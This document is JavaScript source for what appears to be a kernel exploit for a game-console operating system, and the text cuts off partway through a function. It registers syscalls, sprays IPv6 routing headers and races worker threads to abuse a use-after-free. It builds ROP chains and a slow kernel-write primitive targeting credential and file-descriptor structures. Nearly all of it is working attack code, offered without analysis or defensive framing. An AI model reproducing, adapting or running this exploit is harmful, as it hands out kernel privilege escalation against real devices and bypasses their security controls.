// Ensure userland is loaded once
if (typeof libc_addr === 'undefined') {
  include('userland.js');
}

include('kernel.js');
include('stats-tracker.js');
include('binloader.js');

// Polyfill for padStart (older JS engines)
if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart(targetLength, padString) {
    targetLength = targetLength >> 0;
    padString = String(padString !== undefined ? padString : ' ');
    if (this.length > targetLength) {
      return String(this);
    }
    targetLength = targetLength - this.length;
    if (targetLength > padString.length) {
      padString += padString.repeat(targetLength / padString.length);
    }
    return padString.slice(0, targetLength) + String(this);
  };
}

/* ===========================
 *   Syscall registrations
 * ===========================
 */

fn.register(0x29, 'dup', ['bigint'], 'bigint');
var dup = fn.dup;

fn.register(0x06, 'close', ['bigint'], 'bigint');
var close = fn.close;

fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
var read = fn.read;

fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
var write = fn.write;

fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
var ioctl = fn.ioctl;

fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
var pipe = fn.pipe;

fn.register(0x16A, 'kqueue', [], 'bigint');
var kqueue = fn.kqueue;

fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
var socket = fn.socket;

fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
var socketpair = fn.socketpair;

fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
var getsockopt = fn.getsockopt;

fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
var setsockopt = fn.setsockopt;

fn.register(0x17, 'setuid', ['number'], 'bigint');
var setuid = fn.setuid;

fn.register(20, 'getpid', [], 'bigint');
var getpid = fn.getpid;

fn.register(0x14B, 'sched_yield', [], 'bigint');
var sched_yield = fn.sched_yield;

fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_getaffinity = fn.cpuset_getaffinity;

fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_setaffinity = fn.cpuset_setaffinity;

fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
var rtprio_thread = fn.rtprio_thread;

fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint');
var netcontrol = fn.netcontrol;

fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
var thr_new = fn.thr_new;

fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
var thr_kill = fn.thr_kill;

fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
var nanosleep = fn.nanosleep;

fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
var fcntl = fn.fcntl;

/* ===========================
 *   ROP wrappers from syscalls.map
 * ===========================
 */

var read_wrapper = syscalls.map.get(0x03);
var write_wrapper = syscalls.map.get(0x04);
var sched_yield_wrapper = syscalls.map.get(0x14b);
var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
var rtprio_thread_wrapper = syscalls.map.get(0x1D2);
var recvmsg_wrapper = syscalls.map.get(0x1B);
var readv_wrapper = syscalls.map.get(0x78);
var writev_wrapper = syscalls.map.get(0x79);
var thr_exit_wrapper = syscalls.map.get(0x1af);
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278);
var setsockopt_wrapper = syscalls.map.get(0x69);
var getsockopt_wrapper = syscalls.map.get(0x76);

/* ===========================
 *   setjmp / longjmp
 * ===========================
 */

fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
var setjmp = fn.setjmp;
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp_addr = libc_addr.add(0x6CA50);

/* ===========================
 *   Constants
 * ===========================
 */

var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
var KERNEL_PID = 0;
var SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);

var FIOSETOWN = 0x8004667C;
var PAGE_SIZE = 0x4000;

var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;

var AF_UNIX = 1;
var AF_INET6 = 28;
var SOCK_STREAM = 1;
var IPPROTO_IPV6 = 41;

var SO_SNDBUF = 0x1001;
var SOL_SOCKET = 0xffff;

var IPV6_RTHDR = 51;
var IPV6_RTHDR_TYPE_0 = 0;

var RTP_PRIO_REALTIME = 2;

var UIO_READ = 0;
var UIO_WRITE = 1;
var UIO_SYSSPACE = 1;

var CPU_LEVEL_WHICH = 3;
var CPU_WHICH_TID = 1;

var IOV_SIZE = 0x10;
var CPU_SET_SIZE = 0x10;
var PIPEBUF_SIZE = 0x18;
var MSG_HDR_SIZE = 0x30;
var FILEDESCENT_SIZE = 0x8;
var UCRED_SIZE = 0x168;

var RTHDR_TAG = 0x13370000;
var UIO_IOV_NUM = 0x14;
var MSG_IOV_NUM = 0x17;

/* ===========================
 *   Tunables (stability)
 * ===========================
 */

var IPV6_SOCK_NUM = 96;
var IOV_THREAD_NUM = 8;
var UIO_THREAD_NUM = 8;

var MAIN_LOOP_ITERATIONS = 3;
var TRIPLEFREE_ITERATIONS = 8;
var KQUEUE_ITERATIONS = 5000;

var MAX_ROUNDS_TWIN = 5;
var MAX_ROUNDS_TRIPLET = 200;

var MAIN_CORE = 4;
var MAIN_RTPRIO = 0x100;

var RTP_LOOKUP = 0;
var RTP_SET = 1;
var PRI_REALTIME = 2;

var F_SETFL = 4;
var O_NONBLOCK = 4;

var FW_VERSION = null; // Set in init()

/* ===========================
 *   Global state
 * ===========================
 */

var twins = new Array(2);
var triplets = new Array(3);
var ipv6_socks = new Array(IPV6_SOCK_NUM);

var spray_rthdr = malloc(UCRED_SIZE);
var spray_rthdr_len = -1;
var leak_rthdr = malloc(UCRED_SIZE);

// Buffers for potential ROP-based spray/read (kept for structure, can be unused safely)
var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);

var check_len = malloc(4);
write32(check_len, 8);

var fdt_ofiles = new BigInt(0);
var master_r_pipe_file = new BigInt(0);
var victim_r_pipe_file = new BigInt(0);
var master_r_pipe_data = new BigInt(0);
var victim_r_pipe_data = new BigInt(0);

var master_pipe_buf = malloc(PIPEBUF_SIZE);
var msg = malloc(MSG_HDR_SIZE);
var msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);

var uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);

var uio_sock = malloc(8);
var iov_sock = malloc(8);

var iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
var iov_thread_done = malloc(8 * IOV_THREAD_NUM);
var iov_signal_buf = malloc(8 * IOV_THREAD_NUM);

var uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM);

var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM);

var spray_ipv6_ready = malloc(8);
var spray_ipv6_done = malloc(8);
var spray_ipv6_signal_buf = malloc(8);
var spray_ipv6_stack = malloc(0x2000);

var iov_recvmsg_workers = [];
var uio_readv_workers = [];
var uio_writev_workers = [];
var spray_ipv6_worker;

var uaf_socket;
var uio_sock_0;
var uio_sock_1;
var iov_sock_0;
var iov_sock_1;

var pipe_sock = malloc(8);
var master_pipe = [0, 0];
var victim_pipe = [0, 0];

var masterRpipeFd;
var masterWpipeFd;
var victimRpipeFd;
var victimWpipeFd;

var kq_fdp;
var kl_lock;

var tmp = malloc(PAGE_SIZE);

var saved_fpu_ctrl = 0;
var saved_mxcsr = 0;

/* ===========================
 *   Helpers
 * ===========================
 */

function build_rthdr(buf, size) {
  var len = ((size >> 3) - 1) & ~1;
  var actual_size = (len + 1) << 3;

  write8(buf.add(0x00), 0);          // ip6r_nxt
  write8(buf.add(0x01), len);        // ip6r_len
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);
  write8(buf.add(0x03), len >> 1);   // ip6r_segleft

  return actual_size;
}

function set_sockopt(sd, level, optname, optval, optlen) {
  var result = setsockopt(sd, level, optname, optval, optlen);
  if (result.eq(BigInt_Error)) {
    throw new Error('set_sockopt error: ' + hex(result));
  }
  return result;
}

var sockopt_len_ptr = malloc(4);
var nanosleep_timespec = malloc(0x10);
var cpu_mask_buf = malloc(0x10);
var rtprio_scratch = malloc(0x4);
var sockopt_val_buf = malloc(4);
var nc_set_buf = malloc(8);
var nc_clear_buf = malloc(8);
var spawn_thr_args = malloc(0x80);
var spawn_tid = malloc(0x8);
var spawn_cpid = malloc(0x8);

function get_sockopt(sd, level, optname, optval, optlen) {
  write32(sockopt_len_ptr, optlen);
  var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
  if (result.eq(BigInt_Error)) {
    throw new Error('get_sockopt error: ' + hex(result));
  }
  return read32(sockopt_len_ptr);
}

function set_rthdr(sd, buf, len) {
  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function get_rthdr(sd, buf, max_len) {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}

function free_rthdrs(sds) {
  for (var sd of sds) {
    if (!sd.eq(BigInt_Error)) {
      set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
    }
  }
}

function free_rthdr(sd) {
  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
}

function pin_to_core(core) {
  write32(cpu_mask_buf, 1 << core);
  cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Error, CPU_SET_SIZE, cpu_mask_buf);
}

function get_core_index(mask_addr) {
  var num = Number(read32(mask_addr));
  var position = 0;
  while (num > 0) {
    num = num >>> 1;
    position++;
  }
  return position - 1;
}

function get_current_core() {
  cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Error, CPU_SET_SIZE, cpu_mask_buf);
  return get_core_index(cpu_mask_buf);
}

function set_rtprio(prio) {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), prio);
  rtprio_thread(RTP_SET, 0, rtprio_scratch);
}

function get_rtprio() {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), 0);
  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch);
  return Number(read16(rtprio_scratch.add(2)));
}

function fill_buffer_64(addr, value, size) {
  for (var i = 0; i < size; i += 8) {
    write64(addr.add(i), value);
  }
}


/* ===========================
 *   Slow kernel write helper
 * ===========================
 */

function kwriteslow(addr, buffer, size) {
  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size);

  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);

  write64(uioIovWrite.add(0x08), size);

  free_rthdr(ipv6_socks[triplets[1]]);

  var uio_leak_add = leak_rthdr.add(0x08);
  var zeroMemoryCount = 0;

  while (true) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('netctrl failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount = 0;
    }

    trigger_uio_readv();
    sched_yield();

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);

    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break;
    }

    for (var i = 0; i < UIO_THREAD_NUM; i++) {
      write(new BigInt(uio_sock_1), buffer, size);
    }

    wait_uio_readv();
  }

  var uio_iov = read64(leak_rthdr);

  build_uio(msgIov, uio_iov, 0, false, addr, size);

  free_rthdr(ipv6_socks[triplets[2]]);

  var iov_leak_add = leak_rthdr.add(0x20);
  var zeroMemoryCount2 = 0;

  while (true) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 5) {
        log('netctrl failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount2 = 0;
    }

    trigger_iov_recvmsg();
    sched_yield();

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);

    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      break;
    }

    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }

  for (var j = 0; j < UIO_THREAD_NUM; j++) {
    write(new BigInt(uio_sock_1), buffer, size);
  }

  triplets[1] = find_triplet(triplets[0], -1);

  wait_uio_readv();

  write(new BigInt(iov_sock_1), tmp, 1);

  for (var retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] !== -1) break;
    sched_yield();
  }

  if (triplets[2] === -1) {
    debug('kwriteslow - Failed to find triplets[2]');
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }

  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);

  return new BigInt(0);
}

/* ===========================
 *   ROP regen & thread spawn
 * ===========================
 */

function rop_regen_and_loop(last_rop_entry, number_entries) {
  var new_rop_entry = last_rop_entry.add(8);
  var copy_entry = last_rop_entry.sub(number_entries * 8).add(8);
  var rop_loop = last_rop_entry.sub(number_entries * 8).add(8);

  for (var i = 0; i < number_entries; i++) {
    var entry_add = copy_entry;
    var entry_val = read64(copy_entry);

    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET);
    write64(new_rop_entry.add(0x8), entry_add);
    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
    write64(new_rop_entry.add(0x18), entry_val);
    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    copy_entry = copy_entry.add(8);
    new_rop_entry = new_rop_entry.add(0x28);
  }

  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET);
  write64(new_rop_entry.add(0x8), rop_loop);
}

function spawn_thread(rop_array, loop_entries, predefinedStack) {
  var rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600);

  for (var i = 0; i < rop_array.length; i++) {
    write64(rop_addr.add(i * 8), rop_array[i]);
  }

  if (loop_entries !== 0) {
    var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8);
    rop_regen_and_loop(last_rop_entry, loop_entries);
  }

  var jmpbuf = malloc(0x60);

  write64(jmpbuf.add(0x00), gadgets.RET);
  write64(jmpbuf.add(0x10), rop_addr);
  write32(jmpbuf.add(0x40), saved_fpu_ctrl);
  write32(jmpbuf.add(0x44), saved_mxcsr);

  var stack_size = new BigInt(0x100);
  var tls_size = new BigInt(0x40);

  var stack = malloc(Number(stack_size));
  var tls = malloc(Number(tls_size));

  write64(spawn_thr_args.add(0x00), longjmp_addr);
  write64(spawn_thr_args.add(0x08), jmpbuf);
  write64(spawn_thr_args.add(0x10), stack);
  write64(spawn_thr_args.add(0x18), stack_size);
  write64(spawn_thr_args.add(0x20), tls);
  write64(spawn_thr_args.add(0x28), tls_size);
  write64(spawn_thr_args.add(0x30), spawn_tid);
  write64(spawn_thr_args.add(0x38), spawn_cpid);

  var result = thr_new(spawn_thr_args, 0x68);
  if (!result.eq(0)) {
    throw new Error('thr_new failed: ' + hex(result));
  }
  return read64(spawn_tid);
}

/* ===========================
 *   ROP Worker Builders
 * ===========================
 */

function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];

  rop.push(new BigInt(0));

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(CPU_LEVEL_WHICH));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(CPU_WHICH_TID));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error);
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(CPU_SET_SIZE));
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);

  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(RTP_SET));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  var loop_init = rop.length;

  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(iov_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(msg);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(0));
  rop.push(recvmsg_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;

  return {
    rop: rop,
    loop_size: loop_size
  };
}

function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];

  rop.push(new BigInt(0));

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(CPU_LEVEL_WHICH));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(CPU_WHICH_TID));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error);
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(CPU_SET_SIZE));
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);

  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(RTP_SET));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  var loop_init = rop.length;

  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovWrite);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(readv_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;

  return {
    rop: rop,
    loop_size: loop_size
  };
}

function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];

  rop.push(new BigInt(0));

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(CPU_LEVEL_WHICH));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(CPU_WHICH_TID));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error);
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(CPU_SET_SIZE));
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);

  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(RTP_SET));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  var loop_init = rop.length;

  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_1));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovRead);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(writev_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;

  return {
    rop: rop,
    loop_size: loop_size
  };
}

function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];

  rop.push(new BigInt(0));

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(CPU_LEVEL_WHICH));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(CPU_WHICH_TID));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error);
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(CPU_SET_SIZE));
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);

  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(RTP_SET));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  var loop_init = rop.length;

  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  for (var i = 0; i < ipv6_socks.length; i++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[i]);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE));
    rop.push(gadgets.POP_R8_RET);
    rop.push(new BigInt(spray_rthdr_len));
    rop.push(setsockopt_wrapper);
  }

  for (var j = 0; j < ipv6_socks.length; j++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[j]);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(read_rthdr_rop.add(j * 8));
    rop.push(gadgets.POP_R8_RET);
    rop.push(check_len);
    rop.push(getsockopt_wrapper);
  }

  rop.push(gadgets.POP_RDI_RET);
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(0));
  rop.push(thr_exit_wrapper);

  return {
    rop: rop,
    loop_size: 0
  };
}

/* ===========================
 *   Worker Creation
 * ===========================
 */

function create_workers() {
  var sock_buf = malloc(8);

  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    var ready = iov_thread_ready.add(8 * i);
    var done = iov_thread_done.add(8 * i);
    var signal_buf = iov_signal_buf.add(8 * i);

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var pipe_0 = read32(sock_buf);
    var pipe_1 = read32(sock_buf.add(4));

    var ret = iov_recvmsg_worker_rop(ready, new BigInt(pipe_0), done, signal_buf);

    iov_recvmsg_workers[i] = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0,
      pipe_1,
      ready,
      done,
      signal_buf
    };
  }

  /* -------------------------
   *  uio_readv workers
   * -------------------------
   */
  for (var j = 0; j < UIO_THREAD_NUM; j++) {
    var ready2 = uio_readv_thread_ready.add(8 * j);
    var done2 = uio_readv_thread_done.add(8 * j);
    var signal_buf2 = uio_readv_signal_buf.add(8 * j);

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var p0 = read32(sock_buf);
    var p1 = read32(sock_buf.add(4));

    var ret2 = uio_readv_worker_rop(ready2, new BigInt(p0), done2, signal_buf2);

    uio_readv_workers[j] = {
      rop: ret2.rop,
      loop_size: ret2.loop_size,
      pipe_0: p0,
      pipe_1: p1,
      ready: ready2,
      done: done2,
      signal_buf: signal_buf2
    };
  }

  /* -------------------------
   *  uio_writev workers
   * -------------------------
   */
  for (var k = 0; k < UIO_THREAD_NUM; k++) {
    var ready3 = uio_writev_thread_ready.add(8 * k);
    var done3 = uio_writev_thread_done.add(8 * k);
    var signal_buf3 = uio_writev_signal_buf.add(8 * k);

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var pp0 = read32(sock_buf);
    var pp1 = read32(sock_buf.add(4));

    var ret3 = uio_writev_worker_rop(ready3, new BigInt(pp0), done3, signal_buf3);

    uio_writev_workers[k] = {
      rop: ret3.rop,
      loop_size: ret3.loop_size,
      pipe_0: pp0,
      pipe_1: pp1,
      ready: ready3,
      done: done3,
      signal_buf: signal_buf3
    };
  }

  /* -------------------------
   *  IPv6 spray worker (kept for structure only)
   *  NOTE: not used in Stable version, but kept for compatibility
   * -------------------------
   */
  var ready4 = spray_ipv6_ready;
  var done4 = spray_ipv6_done;
  var signal_buf4 = spray_ipv6_signal_buf;

  socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
  var sp0 = read32(sock_buf);
  var sp1 = read32(sock_buf.add(4));

  var ret4 = ipv6_sock_spray_and_read_rop(ready4, new BigInt(sp0), done4, signal_buf4);

  spray_ipv6_worker = {
    rop: ret4.rop,
    loop_size: ret4.loop_size,
    pipe_0: sp0,
    pipe_1: sp1,
    ready: ready4,
    done: done4,
    signal_buf: signal_buf4
  };
}

/* ===========================
 *   Worker Initialization
 * ===========================
 */

function init_workers() {
  init_threading();

  var ret;

  // iov_recvmsg workers
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    ret = spawn_thread(iov_recvmsg_workers[i].rop, iov_recvmsg_workers[i].loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']');
    }
    iov_recvmsg_workers[i].thread_id = Number(ret.and(0xFFFFFFFF));
  }

  // uio_readv workers
  for (var j = 0; j < UIO_THREAD_NUM; j++) {
    ret = spawn_thread(uio_readv_workers[j].rop, uio_readv_workers[j].loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_readv_workers[' + j + ']');
    }
    uio_readv_workers[j].thread_id = Number(ret.and(0xFFFFFFFF));
  }

  // uio_writev workers
  for (var k = 0; k < UIO_THREAD_NUM; k++) {
    ret = spawn_thread(uio_writev_workers[k].rop, uio_writev_workers[k].loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_writev_workers[' + k + ']');
    }
    uio_writev_workers[k].thread_id = Number(ret.and(0xFFFFFFFF));
  }
}

/* ===========================
 *   Worker Trigger / Wait
 * ===========================
 */

function trigger_iov_recvmsg() {
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    write64(iov_recvmsg_workers[i].done, 0);
  }
  for (var j = 0; j < IOV_THREAD_NUM; j++) {
    write(new BigInt(iov_recvmsg_workers[j].pipe_1), iov_recvmsg_workers[j].signal_buf, 1);
  }
}

function wait_iov_recvmsg() {
